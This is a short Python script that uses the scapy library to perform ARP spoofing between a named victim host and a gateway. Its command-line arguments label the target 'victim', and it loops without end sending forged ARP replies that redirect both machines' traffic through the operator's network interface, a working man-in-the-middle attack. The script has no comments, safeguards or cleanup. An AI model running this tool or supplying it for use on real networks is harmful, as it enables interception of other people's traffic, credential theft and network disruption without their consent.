import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import argparse
import time

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", required=True)
    parser.add_argument("-g", "--gateway", required=True)
    parser.add_argument("-i", "--interface", required=True)
    return parser.parse_args()


def get_mac(ip_addr):
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
    ans, _ = scapy.srp(p, timeout=3)
    return ans[0][1].hwsrc


def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac, my_mac):
    while True:
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=my_mac), count=7)
        scapy.send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=my_mac), count=7)
        time.sleep(3)


def main():
    options = args()
    my_mac = scapy.get_if_hwaddr(iff=options.interface)
    gateway_mac = get_mac(options.gateway)
    victim_mac = get_mac(options.victim)
    spoof(options.victim, victim_mac, options.gateway, gateway_mac, my_mac)


if __name__ == "__main__":
    main()
